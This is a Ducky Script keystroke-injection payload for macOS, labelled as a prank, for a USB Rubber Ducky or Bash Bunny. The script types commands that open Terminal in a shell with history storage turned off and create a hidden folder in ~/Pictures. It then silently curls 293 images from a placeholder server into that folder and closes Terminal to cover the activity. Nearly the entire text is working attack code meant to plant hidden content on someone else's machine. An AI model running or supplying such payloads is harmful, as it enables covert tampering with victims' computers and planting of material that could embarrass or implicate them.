REM Title:		Hidden photo folder
REM Author:		Édouard Dupont
REM Description:	Create a hidden directory and download in it a collection of "NFTW" pictures.
REM 			In my simulation, the "malicious" pictures are a set of 293 astronomy photos.
REM 			(Replace "https://example.com/path/IMG_[0001-0293].jpeg" by your own resources URL)
REM Category:		Sprank
REM Target:		macOS 11.0+
REM Version:		0.7-beta
REM License:		GNU General Public License v3.0
REM Requires:		A web (or Object Storage) server to download resources
REM Source:		https://github.com/th3m1s-42/Ducky-Scripts/


REM WARNING! Target uses French GUI & keyboard:
REM 	- for Bash Bunny payload, you have to uncomment "DUCKY_LANG fr" (line 25),
REM 	  with "/languages/fr.json" file installed on the device;
REM 	- for USB Rubber Ducky payload, you can use "jsencoder.html" with the 
REM 	  French keyboard layout (fr.json) to generate the injection file.


REM Delay 100ms between each command:
DEFAULT_DELAY 10

REM ----------------------------------------------------------
REM Bash Bunny payload, the command line below is uncommented:
REM DUCKY_LANG fr
REM ----------------------------------------------------------

REM Open a "Terminal" window:
GUI SPACE
DELAY 50
STRING Terminal.app
ENTER
DELAY 50

REM Open a shell without history:
STRING /bin/zsh -i -o HIST_NO_STORE
ENTER

REM Create a hidden directory in "~/Pictures":
STRING cd ~/Pictures
ENTER
STRING mkdir mes\ photos\ privées
ENTER
STRING chflags hidden mes\ photos\ privées
ENTER

REM Download "NFTW" pictures from the ressources server:
STRING cd mes\ photos\ privées
ENTER
STRING curl --dns-ipv4-addr 9.9.9.9 --dns-ipv6-addr 2620:fe::fe --compressed --remote-name "https://example.com/path/IMG_[0001-0293].jpeg" >& /dev/null &!
ENTER
DELAY 50

REM Quit:
STRING killall Terminal
ENTER
